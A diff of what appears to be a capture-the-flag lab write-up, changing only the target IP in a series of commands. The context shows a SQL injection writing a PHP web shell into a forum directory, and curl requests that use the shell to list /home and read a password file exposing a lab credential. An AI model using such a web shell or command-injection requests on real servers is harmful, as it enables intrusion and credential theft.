@@ -104,7 +104,7 @@ SELECT 1, '<?php system($_GET["cmd"]." 2>&1"); ?>' INTO OUTFILE '/var/www/forum/
 
 ```
 ┌──(neo㉿matrix)-[~]
-└─$ curl --insecure 'https://192.168.1.18/forum/templates_c/gago.php?cmd=ls%20%20/home'
+└─$ curl --insecure 'https://192.168.1.12/forum/templates_c/gago.php?cmd=ls%20%20/home'
 1	LOOKATME
 ft_root
 laurie
@@ -114,7 +114,7 @@ thor
 zaz
 
 ┌──(neo㉿matrix)-[~]
-└─$ curl --insecure 'https://192.168.1.18/forum/templates_c/gago.php?cmd=ls%20-a%20/home'
+└─$ curl --insecure 'https://192.168.1.12/forum/templates_c/gago.php?cmd=ls%20-a%20/home'
 1	.
 ..
 LOOKATME
@@ -126,17 +126,17 @@ thor
 zaz
 
 ┌──(neo㉿matrix)-[~]
-└─$ curl --insecure 'https://192.168.1.18/forum/templates_c/gago.php?cmd=ls%20-a%20/home/LOOKATME'
+└─$ curl --insecure 'https://192.168.1.12/forum/templates_c/gago.php?cmd=ls%20-a%20/home/LOOKATME'
 1	.
 ..
 password
 
 ┌──(neo㉿matrix)-[~]
-└─$ curl --insecure 'https://192.168.1.18/forum/templates_c/gago.php?cmd=ls%20-a%20/home/LOOKATME/password'
+└─$ curl --insecure 'https://192.168.1.12/forum/templates_c/gago.php?cmd=ls%20-a%20/home/LOOKATME/password'
 1	/home/LOOKATME/password
 
 ┌──(neo㉿matrix)-[~]
-└─$ curl --insecure 'https://192.168.1.18/forum/templates_c/gago.php?cmd=cat%20/home/LOOKATME/password'
+└─$ curl --insecure 'https://192.168.1.12/forum/templates_c/gago.php?cmd=cat%20/home/LOOKATME/password'
 1	lmezard:G!@M6f4Eatau{sF"
 
 ```
